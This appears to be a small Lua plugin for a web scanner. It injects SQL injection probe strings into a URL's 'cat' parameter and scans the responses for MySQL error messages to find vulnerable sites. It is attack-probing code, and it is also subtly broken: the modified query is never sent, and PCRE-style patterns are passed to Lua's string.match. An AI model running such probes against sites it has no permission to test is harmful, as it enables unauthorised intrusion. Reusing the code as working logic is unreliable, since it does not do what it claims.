urlparse = require "net.url"

sqli_errors = {'SQL syntax.*MySQL', 'Warning.*?\\Wmysqli?_', 
'MySQLSyntaxErrorException',
'valid MySQL result', 
'check the manual that (corresponds to|fits) your MySQL server version', "Unknown column '[^ ]+' in 'field list'"}

payloads = {
    "'123",
    "''123",
    "`123",
    "\")123",
    "\"))123",
    "`)123",
    "`))123",
    "'))123",
    "')123\"123",
    "[]123",
    "\"\"123",
    "'\"123",
    "\"'123",
    "\123",
}

function matcher(body)
    for index_key,index_value in ipairs(sqli_errors) do
        match = string.match(body, index_value)
        if match == nil then
            -- NOTHING
        else
            print(string.format(">> FOUND: %s",match))
            return 1
        end
    end
end

function main(url)
    for index_key, index_value in ipairs(payloads) do
        query = urlparse.parse(url)
        query.query.cat = index_value
        resp = send_req(url)
        if matcher(resp.body) == 1 then
            break
        end
    end

    return "just_for_testing"
end
